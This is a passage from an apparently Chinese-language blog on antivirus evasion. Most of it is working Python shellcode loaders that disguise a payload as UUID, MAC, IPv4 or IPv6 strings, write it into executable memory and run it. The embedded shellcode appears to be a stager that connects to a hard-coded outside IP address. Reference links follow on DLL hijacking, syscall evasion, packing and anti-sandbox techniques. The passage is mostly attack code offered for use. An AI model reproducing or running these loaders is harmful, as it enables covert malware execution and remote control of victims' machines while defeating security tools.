ab\x55\x82\xf4\x40\xbc\x5b\x9f\xfa\x45\xbd\x37\x51\x3b\xe0\x0d\xa4\x3b\xb2\xd1\xf9\x74\xda\x3a\xd8\x44\xb1\x60\x84\xc5\x83\x10\x70\x5e\x54\x63\xc7\xf8\xf8\x74\x9b\x2b\x6a\x35\x08\xd5\x11\xa9\x32\x98\xec\xd8\x01\xf0\xc4\xae\x4b\x4b\x6c\xba\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x31\x30\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x36\x2e\x30\x3b\x20\x4d\x41\x53\x50\x29\x0d\x0a\x00\x36\x33\x5a\x21\x1c\xe3\x65\x2d\x0e\x19\xa1\xd3\x4c\xf9\x56\xc3\x4e\x54\x7e\x1c\x21\x38\x30\xf3\xf7\x7f\x4a\x21\x52\xb8\x55\x9f\xd0\x0f\x25\x99\x79\x4a\x2b\xcc\xd7\x09\x95\x74\x3b\xee\x1c\xfa\xad\xbd\xec\x84\x00\xdb\xd8\x58\x89\xb8\xad\xd3\x86\x5b\xd3\x09\xc2\xcd\xb6\xfd\x9e\x9f\xb2\x26\xc8\xaa\xfc\x0e\xc9\xf8\xa2\xfd\x5c\x99\x91\xb7\x08\x11\xd8\x91\xde\xfe\x43\x95\x1c\x96\x29\x08\x55\x39\x21\x7d\x8c\xd5\xac\x46\x6e\x78\x65\x16\xb9\xf1\x53\xc6\x25\x76\x78\xd7\xfd\xdd\xb0\x7f\x40\xea\x7f\x68\xba\x6e\x5d\x99\x55\x5f\x11\xd9\x05\x90\x92\x2c\x9e\xb3\x75\x5e\x73\x72\x81\x4d\xe0\x00\xa6\x38\x0b\xed\xe5\x4e\xcb\x8d\xd1\x44\x12\xb3\xf8\xd0\x3a\xcc\xd6\x06\xf1\x36\x4f\x8e\x66\x39\x66\x42\xe3\xc7\x74\xa5\xbd\xac\x0d\xe6\xe5\xd3\x53\x0c\x8e\x90\xca\xd3\x01\x0d\x88\x7c\x91\x63\xdb\xe2\xd9\xb3\x4d\x9f\x57\x3b\x64\x31\x8a\x66\xea\x78\xeb\x07\x09\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x34\x33\x2e\x31\x33\x38\x2e\x32\x37\x2e\x31\x32\x00\x49\x96\x02\xd2&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">UUIDConvert</span>(<span class="params">shellcode</span>):</span><br><span class="line">    uuid_shellcode = []</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(shellcode) % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">        null_byte = <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">16</span> - <span class="built_in">len</span>(shellcode) % <span class="number">16</span>)</span><br><span class="line">        shellcode += null_byte</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(shellcode), <span class="number">16</span>):</span><br><span class="line">        uuid_string = <span class="built_in">str</span>(uuid.UUID(bytes_le=shellcode[i: i + <span class="number">16</span>]))</span><br><span class="line">        uuid_shellcode.append(uuid_string)</span><br><span class="line">    <span class="keyword">return</span> uuid_shellcode</span><br><span class="line"></span><br><span class="line">uuid_shellcode = UUIDConvert(shellcode=shellcode)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ctypes.windll.Activeds.AllocADsMem.restype = ctypes.c_uint64</span><br><span class="line">ptr_alloc = ctypes.windll.Activeds.AllocADsMem(ctypes.c_int(<span class="built_in">len</span>(shellcode)))</span><br><span class="line">ptr_realloc = ctypes.windll.Activeds.ReallocADsMem(ptr_alloc, <span class="built_in">len</span>(shellcode), <span class="built_in">len</span>(shellcode))</span><br><span class="line">ctypes.windll.kernel32.VirtualProtect(ptr_realloc, ctypes.c_int(<span class="built_in">len</span>(shellcode)), <span class="number">0x40</span>, ctypes.byref(ctypes.c_long(<span class="number">1</span>)))</span><br><span class="line"></span><br><span class="line">ptr = ptr_realloc</span><br><span class="line"><span class="keyword">for</span> code <span class="keyword">in</span> uuid_shellcode:</span><br><span class="line">    ctypes.windll.Rpcrt4.UuidFromStringA(code, ptr)</span><br><span class="line">    ptr += <span class="number">16</span></span><br><span class="line"></span><br><span class="line">ctypes.windll.kernel32.EnumSystemLocalesW(ptr_realloc, <span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="python-mac内存加载">python mac内存加载</h4><p><a href="https://blog.csdn.net/luochen2436/article/details/124035788">https://blog.csdn.net/luochen2436/article/details/124035788</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">shellcode=<span class="string">b&quot;\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x60\x11\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x31\x73\x68\x51\x00\x27\x6b\x08\x03\x3f\x21\xf1\xec\xd6\xc0\x3b\xae\xe3\xab\x55\x82\xf4\x40\xbc\x5b\x9f\xfa\x45\xbd\x37\x51\x3b\xe0\x0d\xa4\x3b\xb2\xd1\xf9\x74\xda\x3a\xd8\x44\xb1\x60\x84\xc5\x83\x10\x70\x5e\x54\x63\xc7\xf8\xf8\x74\x9b\x2b\x6a\x35\x08\xd5\x11\xa9\x32\x98\xec\xd8\x01\xf0\xc4\xae\x4b\x4b\x6c\xba\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x31\x30\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x36\x2e\x30\x3b\x20\x4d\x41\x53\x50\x29\x0d\x0a\x00\x36\x33\x5a\x21\x1c\xe3\x65\x2d\x0e\x19\xa1\xd3\x4c\xf9\x56\xc3\x4e\x54\x7e\x1c\x21\x38\x30\xf3\xf7\x7f\x4a\x21\x52\xb8\x55\x9f\xd0\x0f\x25\x99\x79\x4a\x2b\xcc\xd7\x09\x95\x74\x3b\xee\x1c\xfa\xad\xbd\xec\x84\x00\xdb\xd8\x58\x89\xb8\xad\xd3\x86\x5b\xd3\x09\xc2\xcd\xb6\xfd\x9e\x9f\xb2\x26\xc8\xaa\xfc\x0e\xc9\xf8\xa2\xfd\x5c\x99\x91\xb7\x08\x11\xd8\x91\xde\xfe\x43\x95\x1c\x96\x29\x08\x55\x39\x21\x7d\x8c\xd5\xac\x46\x6e\x78\x65\x16\xb9\xf1\x53\xc6\x25\x76\x78\xd7\xfd\xdd\xb0\x7f\x40\xea\x7f\x68\xba\x6e\x5d\x99\x55\x5f\x11\xd9\x05\x90\x92\x2c\x9e\xb3\x75\x5e\x73\x72\x81\x4d\xe0\x00\xa6\x38\x0b\xed\xe5\x4e\xcb\x8d\xd1\x44\x12\xb3\xf8\xd0\x3a\xcc\xd6\x06\xf1\x36\x4f\x8e\x66\x39\x66\x42\xe3\xc7\x74\xa5\xbd\xac\x0d\xe6\xe5\xd3\x53\x0c\x8e\x90\xca\xd3\x01\x0d\x88\x7c\x91\x63\xdb\xe2\xd9\xb3\x4d\x9f\x57\x3b\x64\x31\x8a\x66\xea\x78\xeb\x07\x09\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x34\x33\x2e\x31\x33\x38\x2e\x32\x37\x2e\x31\x32\x00\x49\x96\x02\xd2&quot;</span></span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line">mac_address = ctypes.windll.kernel32.VirtualAlloc(<span class="number">0</span>, <span class="built_in">len</span>(shellcode) / <span class="number">6</span> * <span class="number">17</span>, <span class="number">0x3000</span>, <span class="number">0x40</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(shellcode) / <span class="number">6</span>):</span><br><span class="line">    cut_byte = shellcode[i * <span class="number">6</span>:<span class="number">6</span> + i * <span class="number">6</span>]</span><br><span class="line">    ctypes.windll.Ntdll.RtlEthernetAddressToStringA(cut_byte, mac_address + i * <span class="number">17</span>)</span><br><span class="line">mac_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(shellcode) // <span class="number">6</span>):</span><br><span class="line">    mac = ctypes.string_at(mac_address + i * <span class="number">17</span>, <span class="number">17</span>)</span><br><span class="line">    mac_list.append(mac)</span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(<span class="number">0</span>,<span class="built_in">len</span>(mac_list)*<span class="number">6</span>,<span class="number">0x3000</span>,<span class="number">0x04</span>)</span><br><span class="line"></span><br><span class="line">ptr1 = ptr</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mac_list)):</span><br><span class="line">    ctypes.windll.Ntdll.RtlEthernetStringToAddressA(mac_list[i], mac_list[i], ptr1)</span><br><span class="line">    ptr1 += <span class="number">6</span></span><br><span class="line">ctypes.windll.kernel32.VirtualProtect(ptr, <span class="built_in">len</span>(mac_list)*<span class="number">6</span>, <span class="number">0x40</span>, ctypes.byref(ctypes.c_long(<span class="number">1</span>)))</span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(<span class="number">0</span>, <span class="number">0</span>, ptr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(handle, -<span class="number">1</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="python-ipv4内存加载器">python ipv4内存加载器</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># shellcode填充为4的倍数</span></span><br><span class="line">shellcode = <span class="string">&quot;\xfc\x48\x83......x00\x00&quot;</span></span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line"><span class="comment">#申请ipv4虚拟内存</span></span><br><span class="line">ipv4_address = ctypes.windll.kernel32.VirtualAlloc(<span class="number">0</span>,ctypes.c_int(<span class="built_in">len</span>(shellcode)//<span class="number">4</span>*<span class="number">16</span>),<span class="number">0x3000</span>,<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#将tlIpv4AddressToStringA将shellcode转换为ipv4字符串</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(shellcode)//<span class="number">4</span>):</span><br><span class="line">    cut_byte = shellcode[i*<span class="number">4</span>:<span class="number">4</span>+i*<span class="number">4</span>]</span><br><span class="line">    ctypes.windll.Ntdll.RtlIpv4AddressToStringA(cut_byte, ipv4_address+i*<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">ipv4_list = []</span><br><span class="line"><span class="comment">#获取IPv4 地址的字符串</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(shellcode)//<span class="number">4</span>):</span><br><span class="line">     ipv4_str = ctypes.string_at(ipv4address+i*<span class="number">16</span>,<span class="number">16</span>)</span><br><span class="line">     ipv4_list.append(ipv4_str)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#申请shellcode内存</span></span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(<span class="number">0</span>, <span class="built_in">len</span>(shellcode), <span class="number">0x3000</span>, <span class="number">0x40</span>)</span><br><span class="line">ptr1 = ptr</span><br><span class="line"><span class="comment">#RtlIpv4StringToAddressA将ipv4转为二进制写入内存，内存递归增长4</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ipv4_list)):     </span><br><span class="line"> ctypes.windll.Ntdll.RtlIpv4StringToAddressA(ipv4_list[i],<span class="literal">False</span>,ipv4_list[i],ptr1)</span><br><span class="line"> ptr1 += <span class="number">4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(<span class="number">0</span>, <span class="number">0</span>, ptr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(handle, -<span class="number">1</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="python-ipv6内存加载器">python ipv6内存加载器</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">shellcode=<span class="string">b&quot;\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x60\x11\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x31\x73\x68\x51\x00\x27\x6b\x08\x03\x3f\x21\xf1\xec\xd6\xc0\x3b\xae\xe3\xab\x55\x82\xf4\x40\xbc\x5b\x9f\xfa\x45\xbd\x37\x51\x3b\xe0\x0d\xa4\x3b\xb2\xd1\xf9\x74\xda\x3a\xd8\x44\xb1\x60\x84\xc5\x83\x10\x70\x5e\x54\x63\xc7\xf8\xf8\x74\x9b\x2b\x6a\x35\x08\xd5\x11\xa9\x32\x98\xec\xd8\x01\xf0\xc4\xae\x4b\x4b\x6c\xba\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x31\x30\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x36\x2e\x30\x3b\x20\x4d\x41\x53\x50\x29\x0d\x0a\x00\x36\x33\x5a\x21\x1c\xe3\x65\x2d\x0e\x19\xa1\xd3\x4c\xf9\x56\xc3\x4e\x54\x7e\x1c\x21\x38\x30\xf3\xf7\x7f\x4a\x21\x52\xb8\x55\x9f\xd0\x0f\x25\x99\x79\x4a\x2b\xcc\xd7\x09\x95\x74\x3b\xee\x1c\xfa\xad\xbd\xec\x84\x00\xdb\xd8\x58\x89\xb8\xad\xd3\x86\x5b\xd3\x09\xc2\xcd\xb6\xfd\x9e\x9f\xb2\x26\xc8\xaa\xfc\x0e\xc9\xf8\xa2\xfd\x5c\x99\x91\xb7\x08\x11\xd8\x91\xde\xfe\x43\x95\x1c\x96\x29\x08\x55\x39\x21\x7d\x8c\xd5\xac\x46\x6e\x78\x65\x16\xb9\xf1\x53\xc6\x25\x76\x78\xd7\xfd\xdd\xb0\x7f\x40\xea\x7f\x68\xba\x6e\x5d\x99\x55\x5f\x11\xd9\x05\x90\x92\x2c\x9e\xb3\x75\x5e\x73\x72\x81\x4d\xe0\x00\xa6\x38\x0b\xed\xe5\x4e\xcb\x8d\xd1\x44\x12\xb3\xf8\xd0\x3a\xcc\xd6\x06\xf1\x36\x4f\x8e\x66\x39\x66\x42\xe3\xc7\x74\xa5\xbd\xac\x0d\xe6\xe5\xd3\x53\x0c\x8e\x90\xca\xd3\x01\x0d\x88\x7c\x91\x63\xdb\xe2\xd9\xb3\x4d\x9f\x57\x3b\x64\x31\x8a\x66\xea\x78\xeb\x07\x09\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x34\x33\x2e\x31\x33\x38\x2e\x32\x37\x2e\x31\x32\x00\x49\x96\x02\xd2&quot;</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(shellcode) % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">    null_byte = <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">16</span> - <span class="built_in">len</span>(shellcode) % <span class="number">16</span>)</span><br><span class="line">    shellcode += null_byte</span><br><span class="line">ctypes.windll.Activeds.AllocADsMem.restype = ctypes.c_uint64</span><br><span class="line">ptr_alloc_1 = ctypes.windll.Activeds.AllocADsMem(ctypes.c_int(<span class="built_in">len</span>(shellcode) // <span class="number">16</span> * <span class="number">40</span>))</span><br><span class="line">ptr_realloc_1 = ctypes.windll.Activeds.ReallocADsMem(ptr_alloc_1, <span class="built_in">len</span>(shellcode) // <span class="number">16</span> * <span class="number">40</span>, <span class="built_in">len</span>(shellcode) // <span class="number">16</span> * <span class="number">40</span>)</span><br><span class="line">ctypes.windll.kernel32.VirtualProtect(ptr_realloc_1, ctypes.c_int(<span class="built_in">len</span>(shellcode) // <span class="number">16</span> * <span class="number">40</span>), <span class="number">0x40</span>, ctypes.byref(ctypes.c_long(<span class="number">1</span>)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(shellcode) // <span class="number">16</span>):</span><br><span class="line">    bytes_shellcode = shellcode[i * <span class="number">16</span>: <span class="number">16</span> + i * <span class="number">16</span>]</span><br><span class="line">    ctypes.windll.Ntdll.RtlIpv6AddressToStringA(bytes_shellcode, ptr_realloc_1 + i * <span class="number">40</span>)</span><br><span class="line"></span><br><span class="line">ipv6_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(shellcode) // <span class="number">16</span>):</span><br><span class="line">    ipv6 = ctypes.string_at(ptr_realloc_1 + i * <span class="number">40</span>, <span class="number">40</span>)</span><br><span class="line">    ipv6_list.append(ipv6)</span><br><span class="line"><span class="built_in">print</span>(ipv6_list)</span><br><span class="line"></span><br><span class="line">ptr_alloc_2 = ctypes.windll.Activeds.AllocADsMem(ctypes.c_int(<span class="built_in">len</span>(shellcode)))</span><br><span class="line">ptr_realloc_2 = ctypes.windll.Activeds.ReallocADsMem(ptr_alloc_1, <span class="built_in">len</span>(shellcode), <span class="built_in">len</span>(shellcode))</span><br><span class="line">ctypes.windll.kernel32.VirtualProtect(ptr_realloc_2, ctypes.c_int(<span class="built_in">len</span>(shellcode)), <span class="number">0x40</span>, ctypes.byref(ctypes.c_long(<span class="number">1</span>)))</span><br><span class="line"></span><br><span class="line">rwxpage = ptr_realloc_2</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ipv6_list)):</span><br><span class="line">    ctypes.windll.Ntdll.RtlIpv6StringToAddressA(ipv6_list[i], ipv6_list[i], rwxpage)</span><br><span class="line">    rwxpage += <span class="number">16</span></span><br><span class="line"></span><br><span class="line">ctypes.windll.kernel32.EnumSystemLocalesW(ptr_realloc_2, <span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="nim-shellcode免杀">nim shellcode免杀</h2><p>参考：<a href="https://xz.aliyun.com/t/11052">https://xz.aliyun.com/t/11052</a></p><h2 id="特征码修改-花指令添加-—upx加壳">特征码修改 --花指令添加 —upx加壳</h2><p>思路参考（比较老）</p><p><a href="https://blog.51cto.com/match/1401629">https://blog.51cto.com/match/1401629</a></p><p><a href="https://bbs.kanxue.com/thread-97345.htm">https://bbs.kanxue.com/thread-97345.htm</a></p><h2 id="DLL劫持">DLL劫持</h2><p><a href="https://xz.aliyun.com/t/11711">https://xz.aliyun.com/t/11711</a></p><p><a href="https://f002.backblazeb2.com/file/sec-news-backup/files/writeup/www.freebuf.com/_articles_78807_html/index.html">https://f002.backblazeb2.com/file/sec-news-backup/files/writeup/www.freebuf.com/_articles_78807_html/index.html</a></p><p><a href="https://www.freebuf.com/articles/system/324598.html">https://www.freebuf.com/articles/system/324598.html</a></p><p><a href="https://tttang.com/archive/1365/#toc_0x09">https://tttang.com/archive/1365/#toc_0x09</a></p><p><a href="https://sec-in.com/article/1562">https://sec-in.com/article/1562</a></p><p><a href="https://skewwg.github.io/2020/11/26/diao-yu-yu-she-gong-xi-lie-zhi-dll-jie-chi/">https://skewwg.github.io/2020/11/26/diao-yu-yu-she-gong-xi-lie-zhi-dll-jie-chi/</a></p><h2 id="syscall免杀介绍：">syscall免杀介绍：</h2><p>参考：<a href="https://xz.aliyun.com/t/11448">https://xz.aliyun.com/t/11448</a></p><p><a href="https://xz.aliyun.com/t/11496#toc-2">https://xz.aliyun.com/t/11496#toc-2</a></p><p><a href="https://xz.aliyun.com/t/11532#toc-11">https://xz.aliyun.com/t/11532#toc-11</a></p><h2 id="反沙箱检测">反沙箱检测</h2><p>参考：</p><p><a 